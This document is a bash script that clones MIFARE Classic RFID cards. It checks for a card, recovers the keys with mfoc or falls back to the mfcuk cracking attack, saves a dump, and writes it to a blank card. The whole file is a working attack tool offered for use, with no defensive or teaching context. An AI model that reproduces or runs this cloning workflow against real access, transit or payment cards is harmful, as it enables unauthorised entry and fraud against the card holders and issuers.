#!/bin/bash
set -e

echo "🔍 Checking for MIFARE Classic card..."
nfc-list | grep -q "MIFARE Classic" || {
    echo "❌ No MIFARE Classic card found. Place card on reader."
    exit 1
}

DUMP_FILE="card_$(date +%Y%m%d_%H%M%S).mfd"

echo "🔑 Attempting to read card with default keys..."
mfoc -O "$DUMP_FILE" 2>/dev/null || {
    echo "⚠️  Default keys failed, trying advanced attack..."
    mfcuk -C -R 0:A -s 250 -S 250 -O "$DUMP_FILE" || {
        echo "❌ Failed to read card. Card may use non-standard keys."
        exit 1
    }
}

echo "✅ Card read successfully → $DUMP_FILE"
echo ""
echo "📝 Place blank MIFARE Classic card on reader and press Enter..."
read

echo "✍️  Writing to blank card..."
nfc-mfclassic w a u "$DUMP_FILE"

echo "✅ Clone complete!"